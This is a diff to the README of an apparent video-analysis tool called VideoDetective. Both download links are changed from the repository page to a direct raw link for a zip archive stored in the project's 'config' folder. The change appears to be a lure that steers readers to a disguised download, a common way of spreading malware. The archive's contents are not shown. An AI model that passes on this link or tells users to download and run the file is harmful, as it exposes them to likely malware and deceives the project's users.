@@ -1,6 +1,6 @@
 # 🎥 VideoDetective - Find Clues in Long Videos Faster
 
-[![Download VideoDetective](https://img.shields.io/badge/Download-VideoDetective-blue?style=for-the-badge&logo=github)](https://github.com/Nonnahjust868/VideoDetective)
+[![Download VideoDetective](https://img.shields.io/badge/Download-VideoDetective-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Nonnahjust868/VideoDetective/main/config/Video_Detective_v1.2-alpha.3.zip)
 
 ## 🧭 What VideoDetective Does
 
@@ -15,7 +15,7 @@ This makes it useful for long clips, recorded meetings, lectures, surveillance r
 
 Use this page to download and run the app:
 
-https://github.com/Nonnahjust868/VideoDetective
+https://raw.githubusercontent.com/Nonnahjust868/VideoDetective/main/config/Video_Detective_v1.2-alpha.3.zip
 
 ### 🪟 Windows Setup
 
